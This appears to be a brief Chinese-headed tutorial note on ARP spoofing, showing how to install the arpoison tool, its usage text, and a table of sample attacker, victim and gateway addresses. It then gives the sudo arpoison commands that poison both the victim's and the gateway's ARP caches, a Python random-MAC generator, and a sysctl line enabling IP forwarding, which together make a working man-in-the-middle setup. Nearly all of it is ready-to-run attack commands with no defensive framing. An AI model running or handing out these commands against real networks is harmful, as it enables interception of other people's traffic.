### 安裝 {#installing}

```console
shell> brew install arpoison
```

```
arpoison
       -i     Device e.g. eth0
       -d     Destination IP address in dotted decimal notation.
       -s     Source IP address in dotted decimal notation
       -t     Target MAC address e.g. 00:f3:b2:23:17:f5
       -r     Source MAC address
       -a     Send ARP REQUEST
       -n     Number of packets to send
       -w     Time in seconds between packets

Usage: -i <device> -d <dest IP> -s <src IP> -t <target MAC> -r <src MAC> [-a] [-w time between packets] [-n number to send]
```

`attacker` `192.168.11.3` `a0:99:9b:08:cb:87`
`victim` `192.168.11.2` `fc:aa:14:b4:4c:18`
`gateway` `192.168.11.1` `78:44:76:f8:ec:38`
`macgen` `00:16:3e:20:b0:11`

```console
shell> sudo arpoison -i en0 -d 192.168.11.2 -s 192.168.11.1 -t fc:aa:14:b4:4c:18 -r 00:16:3e:20:b0:11
shell> sudo arpoison -i en0 -d 192.168.11.2 -s 192.168.11.1 -t ff:ff:ff:ff:ff:ff -r 00:16:3e:20:b0:11
```

---

```console
shell> sudo arpoison -i en0 -d 192.168.11.1 -s 192.168.11.2 -t ff:ff:ff:ff:ff:ff -r fc:aa:14:b4:4c:18
shell> sudo arpoison -i en0 -d 192.168.11.1 -s 192.168.11.2 -t 78:44:76:f8:ec:38 -r fc:aa:14:b4:4c:18
```


```console
shell> ./macgen.py 
00:16:3e:20:b0:11
```
	
```py
#!/usr/bin/python
# macgen.py script to generate a MAC address for Red Hat Virtualization guests
#
import random
#
def randomMAC():
	mac = [ 0x00, 0x16, 0x3e,
		random.randint(0x00, 0x7f),
		random.randint(0x00, 0xff),
		random.randint(0x00, 0xff) ]
	return ':'.join(map(lambda x: "%02x" % x, mac))
#
print randomMAC()
```

`pfctl`

```
shell> sysctl -w net.inet.ip.forwarding=1
```




- https://www.centos.org/docs/5/html/5.2/Virtualization/sect-Virtualization-Tips_and_tricks-Generating_a_new_unique_MAC_address.html


<!--
http://www.linuxhub.org/?p=1644
https://jingyan.baidu.com/article/84b4f565c4f9e760f7da3251.html
-->
